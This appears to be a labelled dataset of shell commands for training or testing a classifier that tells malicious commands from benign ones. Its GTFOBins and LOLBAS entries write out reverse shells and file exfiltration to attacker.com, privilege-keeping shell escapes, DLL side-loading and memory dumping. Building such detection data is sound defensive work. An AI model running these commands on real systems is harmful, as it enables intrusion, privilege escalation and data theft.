+{"command": "ssh -o PKCS11Provider=\"\\\\\\\\127.0.0.1\\\\Temp\\\\example.dll\" win@github.com", "label": "malicious", "source": "lolbas", "detail": "ssh.exe", "id": 214}
+{"command": "tar -xf {PATH}:ads", "label": "malicious", "source": "lolbas", "detail": "Tar.exe", "id": 215}
+{"command": "man '-H/bin/sh #' man", "label": "malicious", "source": "gtfobins", "detail": "man", "id": 216}
+{"command": "cd $(dirname $(which ls))", "label": "benign", "source": "nl2bash", "detail": null, "id": 217}
+{"command": "sqlmap -u 127.0.0.1 --eval='...'", "label": "malicious", "source": "gtfobins", "detail": "sqlmap", "id": 218}
+{"command": "find ./ -maxdepth 1 -name \"some-dir\" -type d -print0 | xargs -0r mv -t x/", "label": "benign", "source": "nl2bash", "detail": null, "id": 219}
+{"command": "/path/to/ld.so /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "ld", "id": 220}
+{"command": "efax -d /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "efax", "id": 221}
+{"command": "bash -p", "label": "malicious", "source": "gtfobins", "detail": "ksh", "id": 222}
+{"command": "find . -exec myscript {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 223}
+{"command": "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}", "label": "malicious", "source": "lolbas", "detail": "Url.dll", "id": 224}
+{"command": "find /path/to/dir -newermt \u201cFeb 07\u201d", "label": "benign", "source": "nl2bash", "detail": null, "id": 225}
+{"command": "bash.exe -c \"socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane\"", "label": "malicious", "source": "lolbas", "detail": "Bash.exe", "id": 226}
+{"command": "find -type f -name '*.txt' -print0 | xargs --null perl -pi -e 's/Windows/Linux/'", "label": "benign", "source": "nl2bash", "detail": null, "id": 227}
+{"command": "rustc /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "rustc", "id": 228}
+{"command": "echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /bin/sh 1>&0 2>&0\"}]}' >/path/to/temp-file.jsonc\nfastfetch -c /path/to/temp-file.jsonc", "label": "malicious", "source": "gtfobins", "detail": "fastfetch", "id": 229}
+{"command": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"/path/to/input-file\"));\n    while ((line = br.readLine()) != null) { print(line); }'", "label": "malicious", "source": "gtfobins", "detail": "jrunscript", "id": 230}
+{"command": "ruby -e 'File.open(\"/path/to/output-file\", \"w+\") { |f| f.write(\"DATA\") }'", "label": "malicious", "source": "gtfobins", "detail": "ruby", "id": 231}
+{"command": "find / -type d -size +50k", "label": "benign", "source": "nl2bash", "detail": null, "id": 232}
+{"command": "find -user takuya", "label": "benign", "source": "nl2bash", "detail": null, "id": 233}
+{"command": "tac -s 'RANDOM' /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "tac", "id": 234}
+{"command": "ps aux | awk '{print $2, $4, $11}' | sort -k2rn | head -n 10", "label": "benign", "source": "nl2bash", "detail": null, "id": 235}
+{"command": "ssh root@something 'ls -l'", "label": "benign", "source": "nl2bash", "detail": null, "id": 236}
+{"command": "env | awk -F \"=\" '{print $1}' | grep \".*X.*\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 237}
+{"command": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe", "label": "malicious", "source": "lolbas", "detail": "Ilasm.exe", "id": 238}
+{"command": "find /var/www ! -user apache -print0 | xargs -0", "label": "benign", "source": "nl2bash", "detail": null, "id": 239}
+{"command": "find / -name *.rpm -exec chmod 755 '{}' \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 240}
+{"command": "systemctl", "label": "malicious", "source": "gtfobins", "detail": "systemctl", "id": 241}
+{"command": "find /path/to/input-file -exec cat {} \\;", "label": "malicious", "source": "gtfobins", "detail": "find", "id": 242}
+{"command": "socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane", "label": "malicious", "source": "gtfobins", "detail": "socat", "id": 243}
+{"command": "tmux -S /path/to/socket", "label": "malicious", "source": "gtfobins", "detail": "tmux", "id": 244}
+{"command": "sudo find ./bootstrap/cache/ -type d -exec chown apache:laravel {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 245}
+{"command": "ftp\n!/bin/sh", "label": "malicious", "source": "gtfobins", "detail": "ftp", "id": 246}
+{"command": "echo -e 'package main\\nimport \"os\"\\nfunc main(){\\n\\tf, _ := os.OpenFile(\"/path/to/output-file\", os.O_RDWR|os.O_CREATE, 0644)\\n\\tf.Write([]byte(\"DATA\\\\n\"))\\n\\tf.Close()\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go", "label": "malicious", "source": "gtfobins", "detail": "go", "id": 247}
+{"command": "find . -type f -exec dos2unix {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 248}
+{"command": "ping -c 5 -b 10.11.255.255 | sed -n 's/.* \\([0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\).*/\\1/p' | sort | uniq", "label": "benign", "source": "nl2bash", "detail": null, "id": 249}
+{"command": "find ./ -name Desktop", "label": "benign", "source": "nl2bash", "detail": null, "id": 250}
+{"command": "find \"$path_to_folders\" -name 'm?' -type d -exec mv {} {}.mbox \\; -exec mkdir {}.mbox/Messages \\; -exec sh -c \"mv {}.mbox/*.emlx {}.mbox/Messages\" \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 251}
+{"command": "find ~ -size +2000000c -regex '.*[^gz]' -exec gzip '{}' ';'", "label": "benign", "source": "nl2bash", "detail": null, "id": 252}
+{"command": "node -e 'require(\"fs\").createReadStream(\"/path/to/input-file\").pipe(require(\"http\").request(\"http://attacker.com/path/to/output-file\"))'", "label": "malicious", "source": "gtfobins", "detail": "node", "id": 253}
+{"command": "php -r '$sock=fsockopen(\"attacker.com\",12345);exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'", "label": "malicious", "source": "gtfobins", "detail": "php", "id": 254}
+{"command": "read -rsp $'Press any key to continue...\\n' -n 1 key", "label": "benign", "source": "nl2bash", "detail": null, "id": 255}
+{"command": "cat /etc/fstab | wc -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 256}
+{"command": "find ./lib/app -type f | sort", "label": "benign", "source": "nl2bash", "detail": null, "id": 257}
+{"command": "bind -m vi-insert '\"{\" \"\\C-v{}\\ei\"'", "label": "benign", "source": "nl2bash", "detail": null, "id": 258}
+{"command": "find . -perm /a=x", "label": "benign", "source": "nl2bash", "detail": null, "id": 259}
+{"command": "restic --password-command='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' backup", "label": "malicious", "source": "gtfobins", "detail": "restic", "id": 260}
+{"command": "tree", "label": "benign", "source": "nl2bash", "detail": null, "id": 261}
+{"command": "find /path ! -perm /020", "label": "benign", "source": "nl2bash", "detail": null, "id": 262}
+{"command": "rpmdb --eval '%{lua:...}'", "label": "malicious", "source": "gtfobins", "detail": "rpmdb", "id": 263}
+{"command": "find /path/to/directory -type f -mtime 61 -exec rm -f {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 264}
+{"command": "ed /path/to/output-file\na\nDATA\n.\nw\nq", "label": "malicious", "source": "gtfobins", "detail": "red", "id": 265}
+{"command": "dhclient -sf /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "dhclient", "id": 266}
+{"command": "expect -c 'spawn /bin/sh -p;interact'", "label": "malicious", "source": "gtfobins", "detail": "expect", "id": 267}
+{"command": "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\"", "label": "malicious", "source": "lolbas", "detail": "UtilityFunctions.ps1", "id": 268}
+{"command": "iconv -f 8859_1 -t 8859_1 /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "iconv", "id": 269}
+{"command": "mount -oremount /", "label": "benign", "source": "nl2bash", "detail": null, "id": 270}
+{"command": "winget.exe install --accept-package-agreements -s msstore {name or ID}", "label": "malicious", "source": "lolbas", "detail": "winget.exe", "id": 271}
+{"command": "chown -R $JBOSS_AS_USER:$JBOSS_AS_USER $JBOSS_AS_DIR", "label": "benign", "source": "nl2bash", "detail": null, "id": 272}
+{"command": "dig -f /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "dig", "id": 273}
+{"command": "nc -l -p 12345 </path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "nc", "id": 274}
+{"command": "time sleep 1", "label": "benign", "source": "nl2bash", "detail": null, "id": 275}
+{"command": "find . -name '* *'", "label": "benign", "source": "nl2bash", "detail": null, "id": 276}
+{"command": "find /home/www/ -type f -exec sed -i 's/subdomainA\\.example.com/subdomainB.example.com/g' {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 277}
+{"command": "find . -name \"*.java\" -exec grep \"String\" {} \\+", "label": "benign", "source": "nl2bash", "detail": null, "id": 278}
+{"command": "adplus.exe -c {PATH:.xml}", "label": "malicious", "source": "lolbas", "detail": "adplus.exe", "id": 279}
+{"command": "bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'", "label": "malicious", "source": "gtfobins", "detail": "ksh", "id": 280}
+{"command": "aspell -c /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "aspell", "id": 281}
+{"command": "find . -type f -printf '%p %s\\n' | perl -n -a -e '$sum+=$S[1]; print \"$sum\\n\"'", "label": "benign", "source": "nl2bash", "detail": null, "id": 282}
+{"command": "w | awk '{print $1}' | xargs -I '{}' id '{}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 283}
+{"command": "find /home -perm /u=r", "label": "benign", "source": "nl2bash", "detail": null, "id": 284}
+{"command": "mkdir ~/practice", "label": "benign", "source": "nl2bash", "detail": null, "id": 285}
+{"command": "ssh -F /path/to/input-file x", "label": "malicious", "source": "gtfobins", "detail": "ssh", "id": 286}
+{"command": "find . -name \"*.rb\" -type f -print0 | xargs -0 wc -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 287}
+{"command": "write.exe", "label": "malicious", "source": "lolbas", "detail": "write.exe", "id": 288}
+{"command": "reset.exe session", "label": "malicious", "source": "lolbas", "detail": "Reset.exe", "id": 289}
+{"command": "restic --password-command='/path/to/command' backup", "label": "malicious", "source": "gtfobins", "detail": "restic", "id": 290}
+{"command": "find . -size -26c -size +23c -ls", "label": "benign", "source": "nl2bash", "detail": null, "id": 291}
+{"command": "find /etc -type l", "label": "benign", "source": "nl2bash", "detail": null, "id": 292}
+{"command": "cpulimit -l 100 -f -- /bin/sh -p", "label": "malicious", "source": "gtfobins", "detail": "cpulimit", "id": 293}
+{"command": "fsianycpu.exe {PATH:.fsscript}", "label": "malicious", "source": "lolbas", "detail": "FsiAnyCpu.exe", "id": 294}
+{"command": "ln -fs /bin/sh /bin/ln\nln", "label": "malicious", "source": "gtfobins", "detail": "ln", "id": 295}
+{"command": "nc victim.com 12345 >/path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "nc", "id": 296}
+{"command": "mawk 'BEGIN {system(\"/bin/sh\")}'", "label": "malicious", "source": "gtfobins", "detail": "awk", "id": 297}
+{"command": "latex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'", "label": "malicious", "source": "gtfobins", "detail": "latex", "id": 298}
+{"command": "tar -xvzf passwd.tar.gz", "label": "benign", "source": "nl2bash", "detail": null, "id": 299}
+{"command": "ls -1 | tr '\\n' ','", "label": "benign", "source": "nl2bash", "detail": null, "id": 300}
+{"command": "unset -v latest", "label": "benign", "source": "nl2bash", "detail": null, "id": 301}
+{"command": "cp /path/to/command ~/.lessfilter\nless /etc/hosts", "label": "malicious", "source": "gtfobins", "detail": "less", "id": 302}
+{"command": "curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 303}
+{"command": "source <(./generate_commands)", "label": "benign", "source": "nl2bash", "detail": null, "id": 304}
+{"command": "devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test", "label": "malicious", "source": "lolbas", "detail": "Devtoolslauncher.exe", "id": 305}
+{"command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"", "label": "malicious", "source": "lolbas", "detail": "Forfiles.exe", "id": 306}
+{"command": "find /tmp -user me -ls", "label": "benign", "source": "nl2bash", "detail": null, "id": 307}
+{"command": "sftp -D \"{CMD}\"", "label": "malicious", "source": "lolbas", "detail": "Sftp.exe", "id": 308}
+{"command": "alias ff=find . -name $1", "label": "benign", "source": "nl2bash", "detail": null, "id": 309}
+{"command": "regasm.exe {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Regasm.exe", "id": 310}
+{"command": "git reset --hard HEAD~1", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 311}
+{"command": "find /etc/sysconfig -amin -30", "label": "benign", "source": "nl2bash", "detail": null, "id": 312}
+{"command": "find `echo \"${searchpath}\"` -type f -print0 | xargs -0 grep -l -E '\"${string1}\".*\"${string2}\".*\"${string3}\"'", "label": "benign", "source": "nl2bash", "detail": null, "id": 313}
+{"command": "ksu -q -e /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "ksu", "id": 314}
+{"command": "echo '#!/bin/sh' >/path/to/temp-file\necho -e \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" >>/path/to/temp-file\nchmod +x /path/to/temp-file\nforge build --use /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "forge", "id": 315}
+{"command": "find . -name \"*.jar\" -exec unzip -l {} \\;|grep -E \"Archive:|message_track.properties\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 316}
+{"command": "comm abc def", "label": "benign", "source": "nl2bash", "detail": null, "id": 317}
+{"command": "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java", "label": "malicious", "source": "lolbas", "detail": "Pcalua.exe", "id": 318}
+{"command": "find /myfiles -name '*blue*'", "label": "benign", "source": "nl2bash", "detail": null, "id": 319}
+{"command": "find $backup_path/* -mtime +30 -exec rm {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 320}
+{"command": "curl victim.com -o /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "python", "id": 321}
+{"command": "/usr/bin/ifconfig eth0 | grep --word-regexp inet | awk '{print $2}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 322}
+{"command": "jobs -l | grep 'test.sh &' | grep -v grep | awk '{print $2}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 323}
+{"command": "scp -o PKCS11Provider=\"{PATH_SMB:.dll}\" . win@github.com:.", "label": "malicious", "source": "lolbas", "detail": "scp.exe", "id": 324}
+{"command": "echo \"<line>\" | cut -d \";\" -f 2", "label": "benign", "source": "nl2bash", "detail": null, "id": 325}
+{"command": "nc -l -p 12345", "label": "malicious", "source": "gtfobins", "detail": "php", "id": 326}
+{"command": "echo /path/to/input-file | cpio -o", "label": "malicious", "source": "gtfobins", "detail": "cpio", "id": 327}
+{"command": "( find . -name '*.txt' -exec cat {} ';' ) | sed 's/ /\\n/g' | grep '^aaa$' | wc -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 328}
+{"command": "xmllint example.xml --xpath \"/config/*/@*\" | sed \"s| key|\\nkey|g\" | nl", "label": "benign", "source": "nl2bash", "detail": null, "id": 329}
+{"command": "diantz /f {PATH:.ddf}", "label": "malicious", "source": "lolbas", "detail": "Diantz.exe", "id": 330}
+{"command": "$@ | tee $FILE", "label": "benign", "source": "nl2bash", "detail": null, "id": 331}
+{"command": "vstest.console.exe {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "vstest.console.exe", "id": 332}
+{"command": "find . -name  \"*.java\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 333}
+{"command": "journalctl", "label": "malicious", "source": "gtfobins", "detail": "journalctl", "id": 334}
+{"command": "find /var/www/vhosts/*/httpdocs/ -type f -iwholename \"*/modules/system/system.info\" -exec grep -H \"version = \\\"\" {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 335}
+{"command": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\necho '/path/to/command' >/path/to/temp-dir/bin/rustc\nchmod +x /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc", "label": "malicious", "source": "gtfobins", "detail": "rustup", "id": 336}
+{"command": "nmap -oG=/path/to/output-file DATA", "label": "malicious", "source": "gtfobins", "detail": "nmap", "id": 337}
+{"command": "bash -p", "label": "malicious", "source": "gtfobins", "detail": "bash", "id": 338}
+{"command": "find whatever -print0 | xargs -0 command", "label": "benign", "source": "nl2bash", "detail": null, "id": 339}
+{"command": "find . -exec utility \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 340}
+{"command": "troff /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "troff", "id": 341}
+{"command": "m4 /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "m4", "id": 342}
+{"command": "cdb.exe -cf {PATH:.wds} -o notepad.exe", "label": "malicious", "source": "lolbas", "detail": "Cdb.exe", "id": 343}
+{"command": "dig -x 72.51.34.34", "label": "benign", "source": "nl2bash", "detail": null, "id": 344}
+{"command": "ping -c 5 -b 10.10.0.255 | grep 'bytes from' | awk '{ print $4 }' | sort | uniq", "label": "benign", "source": "nl2bash", "detail": null, "id": 345}
+{"command": "nc -l -p 80 | awk 'BEGIN {RS=\"\\r\\n\\r\\n\";ORS=\"\"} NR==2' >/path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "ab", "id": 346}
+{"command": "Update.exe --update={PATH_SMB:folder}", "label": "malicious", "source": "lolbas", "detail": "Update.exe", "id": 347}
+{"command": "dotnet.exe {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Dotnet.exe", "id": 348}
+{"command": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\ncp /bin/sh /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc", "label": "malicious", "source": "gtfobins", "detail": "rustup", "id": 349}
+{"command": "pwsh -c '\"DATA\" | Out-File /path/to/output-file'", "label": "malicious", "source": "gtfobins", "detail": "pwsh", "id": 350}
+{"command": "find ~/Books -type f -name Waldo", "label": "benign", "source": "nl2bash", "detail": null, "id": 351}
+{"command": "time /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "time", "id": 352}
+{"command": "tcsh -b", "label": "malicious", "source": "gtfobins", "detail": "tcsh", "id": 353}
+{"command": "find . -name '*.deb' | xargs -n1 basename", "label": "benign", "source": "nl2bash", "detail": null, "id": 354}
+{"command": "find . -type f -exec wc -l {} \\; | awk '{total += $1} END{print total}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 355}
+{"command": "sort -m /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "sort", "id": 356}
+{"command": "top -p \"$(pgrep -d ',' java)\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 357}
+{"command": "echo DATA >/path/to/temp-file\ncurl file:///path/to/temp-file -o /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "curl", "id": 358}
+{"command": "Update.exe --updateRollback={REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Update.exe", "id": 359}
+{"command": "base58 /path/to/input-file | base58 --decode", "label": "malicious", "source": "gtfobins", "detail": "base58", "id": 360}
+{"command": "volatility -f /path/to/core-dump volshell\n...", "label": "malicious", "source": "gtfobins", "detail": "volatility", "id": 361}
+{"command": "echo '...' >/path/to/temp-file\ntshark -Xlua_script:/path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "tshark", "id": 362}
+{"command": "curl file:///path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "curl", "id": 363}
+{"command": "socat -u file:/path/to/input-file -", "label": "malicious", "source": "gtfobins", "detail": "socat", "id": 364}
+{"command": "LBUFFER+=\"$(date)\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 365}
+{"command": "find dir_to_start -name dir_to_exclude -prune -o -print0 | xargs -0 chown owner", "label": "benign", "source": "nl2bash", "detail": null, "id": 366}
+{"command": "chmod -R 755 ./scripts", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 367}
+{"command": "basez /path/to/input-file | basez --decode", "label": "malicious", "source": "gtfobins", "detail": "basez", "id": 368}
+{"command": "find / -type f -name \"*.txt\" -print | xargs rm", "label": "benign", "source": "nl2bash", "detail": null, "id": 369}
+{"command": "vim -c ':py ...'", "label": "malicious", "source": "gtfobins", "detail": "rvim", "id": 370}
+{"command": "php -S 0.0.0.0:80", "label": "malicious", "source": "gtfobins", "detail": "php", "id": 371}
+{"command": "dirname `readlink -e relative/path/to/file`", "label": "benign", "source": "nl2bash", "detail": null, "id": 372}
+{"command": "stat -f 'File: %N Modified: %t%Sm' t* |column -t", "label": "benign", "source": "nl2bash", "detail": null, "id": 373}
+{"command": "find | xargs ipython nbconvert", "label": "benign", "source": "nl2bash", "detail": null, "id": 374}
+{"command": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\"", "label": "malicious", "source": "lolbas", "detail": "msedgewebview2.exe", "id": 375}
+{"command": "find /home/jassi/ -name \"aliencoders.[0-9]+\" |& xargs ls -lrt | awk '{print $9}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 376}
+{"command": "curl --engine /path/to/lib.so x", "label": "malicious", "source": "gtfobins", "detail": "curl", "id": 377}
+{"command": "awk '{printf \"%s \", $0}' inputfile", "label": "benign", "source": "nl2bash", "detail": null, "id": 378}
+{"command": "find / -cmin -60", "label": "benign", "source": "nl2bash", "detail": null, "id": 379}
+{"command": "find /home -type d ! -exec test -e '{}/bin' \\; -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 380}
+{"command": "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'", "label": "malicious", "source": "gtfobins", "detail": "ksh", "id": 381}
+{"command": "find /dir/path/look/up -name \"dir-name-here\" -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 382}
+{"command": "makecab /F {PATH:.ddf}", "label": "malicious", "source": "lolbas", "detail": "Makecab.exe", "id": 383}
+{"command": "vim -c ':lua ...'", "label": "malicious", "source": "gtfobins", "detail": "view", "id": 384}
+{"command": "find . -mtime -3 -exec rm -rf {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 385}
+{"command": "regsvr32.exe /u /s {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Regsvr32.exe", "id": 386}
+{"command": "find . -type d -maxdepth 1 -exec ls -dlrt {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 387}
+{"command": "find -type f", "label": "benign", "source": "nl2bash", "detail": null, "id": 388}
+{"command": "$(dirname $(readlink -f $BASH_SOURCE))", "label": "benign", "source": "nl2bash", "detail": null, "id": 389}
+{"command": "echo '...' >/path/to/temp-file\nneedrestart -c /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "needrestart", "id": 390}
+{"command": "echo x | xargs -o -a /dev/null /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "xargs", "id": 391}
+{"command": "ssh -i ~/path/mykeypair.pem ubuntu@ec2-XX-XXX-XXX-XXX.us-west-2.compute.amazonaws.com", "label": "benign", "source": "nl2bash", "detail": null, "id": 392}
+{"command": "octave-cli --eval 'format none; fid = fopen(\"/path/to/input-file\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'", "label": "malicious", "source": "gtfobins", "detail": "octave", "id": 393}
+{"command": "ln -s /bin/sh git-x\ngit --exec-path=. x", "label": "malicious", "source": "gtfobins", "detail": "git", "id": 394}
+{"command": "python -m http.server 80", "label": "malicious", "source": "gtfobins", "detail": "jjs", "id": 395}
+{"command": "ghc -e 'System.Process.callCommand \"/bin/sh\"'", "label": "malicious", "source": "gtfobins", "detail": "ghc", "id": 396}
+{"command": "mawk '//' /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "mawk", "id": 397}
+{"command": "find / -name expect 2>/dev/null", "label": "benign", "source": "nl2bash", "detail": null, "id": 398}
+{"command": "find -type f -perm -110", "label": "benign", "source": "nl2bash", "detail": null, "id": 399}
+{"command": "tar -xOf TarFile FileB.gz | zless", "label": "benign", "source": "nl2bash", "detail": null, "id": 400}
+{"command": "setlock - /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "setlock", "id": 401}
+{"command": "wget -i /path/to/input-file -o /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "wget", "id": 402}
+{"command": "msedgewebview2.exe --utility-cmd-prefix=\"{CMD}\"", "label": "malicious", "source": "lolbas", "detail": "msedgewebview2.exe", "id": 403}
+{"command": "zcat file.gz", "label": "benign", "source": "nl2bash", "detail": null, "id": 404}
+{"command": "find / -maxdepth 1 -xdev -type f  -exec grep -li stringtofind '{}' \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 405}
+{"command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:.", "label": "malicious", "source": "lolbas", "detail": "AddinUtil.exe", "id": 406}
+{"command": "find / -name  \"*.txt\" -mount 2> /dev/null", "label": "benign", "source": "nl2bash", "detail": null, "id": 407}
+{"command": "find -perm -111 -type f", "label": "benign", "source": "nl2bash", "detail": null, "id": 408}
+{"command": "(find . -type f -ctime $FTIME && find . -type f -atime $FTIME && find . -type f -mtime $FTIME) | sort | uniq", "label": "benign", "source": "nl2bash", "detail": null, "id": 409}
+{"command": "ssh user@attacker.com 'cat /path/to/input-file\"", "label": "malicious", "source": "gtfobins", "detail": "ssh", "id": 410}
+{"command": "gawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'", "label": "malicious", "source": "gtfobins", "detail": "gawk", "id": 411}
+{"command": "as @/path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "as", "id": 412}
+{"command": "find /usr/share/doc -name README\\*", "label": "benign", "source": "nl2bash", "detail": null, "id": 413}
+{"command": "find tmp -maxdepth 1 -name '*.mp3' -maxdepth 1 | xargs    -n1 rm", "label": "benign", "source": "nl2bash", "detail": null, "id": 414}
+{"command": "find -name '*.php' -exec grep -li \"fincken\" {} + | xargs grep -l \"TODO\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 415}
+{"command": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1", "label": "malicious", "source": "lolbas", "detail": "AgentExecutor.exe", "id": 416}
+{"command": "find . -name \"*.cpp\" | while read f; do dirname \"$f\" ; done | sort -u", "label": "benign", "source": "nl2bash", "detail": null, "id": 417}
+{"command": "jjs\nvar BufferedReader = Java.type('java.io.BufferedReader');\nvar FileReader = Java.type('java.io.FileReader');\nvar br = new BufferedReader(new FileReader('/path/to/input-file'));\nwhile ((line = br.readLine()) != null) { print(line); }", "label": "malicious", "source": "gtfobins", "detail": "jjs", "id": 418}
+{"command": "arj a /path/to/output-file /path/to/input-file\narj p /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "arj", "id": 419}
+{"command": "find /dir/containing/unsigned -name '*.pdf' -print0", "label": "benign", "source": "nl2bash", "detail": null, "id": 420}
+{"command": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}", "label": "malicious", "source": "lolbas", "detail": "msedge_proxy.exe", "id": 421}
+{"command": "ps -ef | grep postgres", "label": "benign", "source": "nl2bash", "detail": null, "id": 422}
+{"command": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"", "label": "malicious", "source": "lolbas", "detail": "Wmic.exe", "id": 423}
+{"command": "set | grep -oP '^\\w*(?==)' | grep X", "label": "benign", "source": "nl2bash", "detail": null, "id": 424}
+{"command": "openssl req -engine ./lib.so", "label": "malicious", "source": "gtfobins", "detail": "openssl", "id": 425}
+{"command": "tsc /path/to/input-file.ts --outFile /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "tsc", "id": 426}
+{"command": "gem open -e '/bin/sh -s' debug", "label": "malicious", "source": "gtfobins", "detail": "gem", "id": 427}
+{"command": "tail -f /var/log/some.log | grep --line-buffered foo | grep bar", "label": "benign", "source": "nl2bash", "detail": null, "id": 428}
+{"command": "iftop\n!/bin/sh", "label": "malicious", "source": "gtfobins", "detail": "iftop", "id": 429}
+{"command": "socket -svp '/bin/sh -i' 12345", "label": "malicious", "source": "gtfobins", "detail": "socket", "id": 430}
+{"command": "IntelliTrace.exe launch /cp:\"collectionplan.xml\" /f:\"c:\\users\\public\\log\" \"C:\\Windows\\System32\\calc.exe\"", "label": "malicious", "source": "lolbas", "detail": "IntelliTrace.exe", "id": 431}
+{"command": "find . -perm /g+s | head", "label": "benign", "source": "nl2bash", "detail": null, "id": 432}
+{"command": "dump64.exe {PID} out.dmp", "label": "malicious", "source": "lolbas", "detail": "Dump64.exe", "id": 433}
+{"command": "find \"$source_dir\" -type f -regex \".*\\.\\(avi\\|wmv\\|flv\\|mp4\\)\" -print0", "label": "benign", "source": "nl2bash", "detail": null, "id": 434}
+{"command": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\"'", "label": "malicious", "source": "gtfobins", "detail": "perl", "id": 435}
